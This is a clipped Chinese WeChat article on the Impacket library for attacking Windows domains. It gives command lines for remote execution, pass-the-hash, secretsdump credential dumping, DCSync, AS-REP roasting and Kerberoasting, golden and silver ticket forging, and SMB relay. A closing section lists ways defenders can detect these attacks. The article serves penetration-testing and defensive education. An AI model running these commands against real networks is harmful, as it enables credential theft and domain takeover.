---
title: 【微信】Impacket：网络协议攻击的瑞士军刀实战
source: https://mp.weixin.qq.com/s/9fZ4BVhBwDKxs4nvS1ScCA
source_host: mp.weixin.qq.com
clip_date: 2026-11-09T10:40:37+08:00
trace_id: 9ef47049-d1e4-4556-b6a5-afd7267b329e
content_hash: 918acac6c761129e300f3ebee5173b7a47728a513732a8f4e3f8f69a08a788b6
status: synced
tags:
  - 微信
series: null
feed_source: 公众号聚合·Doonsec
ai_summary: null
ai_summary_style: null
images_status:
  total: 1
  succeeded: 1
  failed_urls: []
notion_page_id: 41375244-d011-8131-96d9-f351ac85e754
ioc:
  cves: []
  cwes: []
  hashes:
    - 31d6cfe0d16ae931b73c59d7e0c089c0
    - aad3b435b51404eeaad3b435b51404ee
  domains: []
  tools: []
  techniques: []
---

**运维安全入门** *2026年11月9日 08:30*

## Impacket：网络协议攻击的瑞士军刀实战

在内网渗透与域环境攻防中，有一款 Python 库几乎是所有高级攻击工具的"底层引擎"。它不是直接面向用户的"一键脚本"，而是 **提供了对 SMB、LDAP、Kerberos、MSRPC 等网络协议的底层操作能力**。

这款库就是 **Impacket**。

从 NetExec（原 CrackMapExec）到 BloodHound 的采集器，从 Pass-The-Hash 到 DCSync 攻击，几乎所有内网渗透工具的核心协议交互都依赖于 Impacket。

今天，我们就来深度拆解这款"幕后英雄"的核心模块、高阶实战玩法，以及运维团队该如何在协议层检测基于 Impacket 的攻击行为。

## 01为什么 Impacket 无可替代？

Impacket 的强大在于 **对 Windows 网络协议的深度逆向与封装**。它提供了以下核心能力：

1.  **SMB/CIFS 协议操作**
    
    ：文件共享访问、远程命令执行（SMBExec）、哈希导出（secretsdump）。
    
2.  **LDAP/Active Directory 操作**
    
    ：域用户枚举、ACL 查询、NTDS.dit 导出（DCSync）。
    
3.  **Kerberos 协议操作**
    
    ：票据请求（GetNPUsers）、票据伪造（Golden Ticket）、票据传递（Pass-The-Ticket）。
    
4.  **MSRPC 协议操作**
    
    ：远程注册表访问、服务管理、WMI 执行。
    

**典型攻击链路**：

```
使用 Impacket 的 smbexec.py 在目标机器执行命令 → 使用 secretsdump.py 导出本地 SAM 哈希 → 使用 psexec.py 利用哈希传递获取域控权限
```

## 02安装与环境准备

### 1\. 使用 pip 安装（推荐）

```bash
pip install impacket
```

### 2\. 从源码安装（获取最新示例脚本）

```bash
git clone https://github.com/fortra/impacket cd impacket pip install -r requirements.txt python setup.py install
```

### 3\. 使用 Docker 运行（免依赖）

```bash
docker pull opensecurity/impacket docker run -it --rm opensecurity/impacket smbexec.py company.local/administrator@192.168.1.10
```

## 03核心模块与实战玩法

Impacket 提供了数十个示例脚本，以下是内网渗透中最高频使用的核心模块：

### 1\. SMBExec：远程命令执行（不落地）

```sql
# 使用明文密码执行远程命令 smbexec.py company.local/administrator:'Password123'@192.168.1.10  # 使用 NTLM Hash 执行（Pass-The-Hash） smbexec.py -hashes :aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 company.local/administrator@192.168.1.10  # 指定自定义命令 smbexec.py company.local/administrator:'Password123'@192.168.1.10 'whoami /all'
```

### 2\. PSExec：交互式 Shell（经典）

```
# 获取目标机器的交互式 CMD Shell psexec.py company.local/administrator:'Password123'@192.168.1.10  # 使用 Hash 传递 psexec.py -hashes :aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 company.local/administrator@192.168.1.10
```

### 3\. SecretsDump：哈希导出（核心）

```sql
# 导出目标机器的本地 SAM 数据库哈希 secretsdump.py company.local/administrator:'Password123'@192.168.1.10  # 导出域控的 NTDS.dit（所有域用户哈希） secretsdump.py company.local/administrator:'Password123'@192.168.1.10 -ntds  # 仅导出 LSA 缓存凭据 secretsdump.py company.local/administrator:'Password123'@192.168.1.10 -lsa
```

### 4\. GetNPUsers：Kerberoasting 攻击

```
# 枚举域内不需要 Kerberos 预认证的用户（AS-REP Roasting） GetNPUsers.py company.local/ -usersfile users.txt -format hashcat  # 针对特定用户 GetNPUsers.py company.local/alice -format hashcat
```

### 5\. GetUserSPNs：Kerberoasting 攻击

```
# 枚举域内拥有 SPN 的服务账号（Kerberoasting） GetUserSPNs.py company.local/administrator:'Password123' -request  # 导出为 hashcat 格式 GetUserSPNs.py company.local/administrator:'Password123' -request -format hashcat
```

### 6\. DCSync：域控哈希同步（高危）

```
# 使用 DCSync 导出指定用户的哈希（需要域管或 DCSync 权限） secretsdump.py company.local/administrator:'Password123'@192.168.1.10 -just-dc-user krbtgt  # 导出所有域用户哈希 secretsdump.py company.local/administrator:'Password123'@192.168.1.10 -just-dc
```

## 04高阶攻击场景

### 1\. 利用 Golden Ticket 持久化

```
# 使用 ticketer.py 伪造 Golden Ticket（需要 krbtgt 哈希） ticketer.py -nthash aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 -domain-sid S-1-5-21-xxx -domain company.local administrator  # 使用伪造的票据访问域控 export KRB5CCNAME=administrator.ccache smbexec.py -k -no-pass company.local/administrator@dc01.company.local
```

### 2\. 利用 Silver Ticket 访问特定服务

```
# 伪造针对 MSSQL 服务的 Silver Ticket ticketer.py -nthash <service_hash> -domain-sid S-1-5-21-xxx -domain company.local -spn MSSQLSvc/sql01.company.local:1433 sqladmin  # 使用票据访问 MSSQL 服务 mssqlclient.py -k -no-pass sql01.company.local
```

### 3\. 利用 SMB Relay 攻击

```
# 启动 SMB Relay 服务器（监听 445 端口） ntlmrelayx.py -t smb://192.168.1.20 -smb2support  # 配合 Responder 进行 LLMNR/NBT-NS 欺骗 sudo responder -I eth0 -dwv
```

## 05蓝队视角：如何检测 Impacket 攻击？

### 1\. 流量层检测（NTA/IDS）

-   **异常 SMB 连接**
    
    ：Impacket 的 smbexec/psexec 会在短时间内建立大量 445 端口连接，且伴随 `SMB2 CREATE` 请求（上传临时服务二进制文件）。
    
-   **Kerberos 异常请求**
    
    ：GetNPUsers/GetUserSPNs 会发起大量 `AS-REQ` 或 `TGS-REQ` 请求，且目标为非常见用户。
    
-   **LDAP 高频查询**
    
    ：secretsdump 的 DCSync 模式会发起 `DS-Replication-Get-Changes` 请求，这是域控同步的核心操作，普通用户不应触发。
    

### 2\. 主机层日志（Windows Event Logs）

-   **事件 ID 7045（服务安装）**
    
    ：smbexec/psexec 会在目标机器创建临时服务（如 `BTOBTO` 、 `REMCOM` ），触发 7045 日志。
    
-   **事件 ID 4688（进程创建）**
    
    ：监测 `services.exe` 拉起的异常子进程（如 `cmd.exe` 、 `powershell.exe` ）。
    
-   **事件 ID 4769（Kerberos 票据请求）**
    
    ：监测异常的 `TGS-REQ` 请求，尤其是针对高权限 SPN 的请求。
    

### 3\. 域控层审计

-   **DCSync 检测**
    
    ：监测 `DS-Replication-Get-Changes` 和 `DS-Replication-Get-Changes-All` 权限的使用，普通用户不应具备此权限。
    
-   **Golden Ticket 检测**
    
    ：监测票据请求中的异常 PAC（Privilege Attribute Certificate）信息，尤其是 SID 历史字段。
    

## 06总结

Impacket 是内网渗透的"底层引擎"，它将复杂的网络协议交互封装成了简洁的 Python 脚本。对于红队而言，它是构建自定义攻击工具的基础库；对于蓝队与运维安全人员而言，深刻理解 Impacket 的协议行为与流量特征，才是构建企业内网"深度检测"体系的核心能力。

安全工具 · 目录
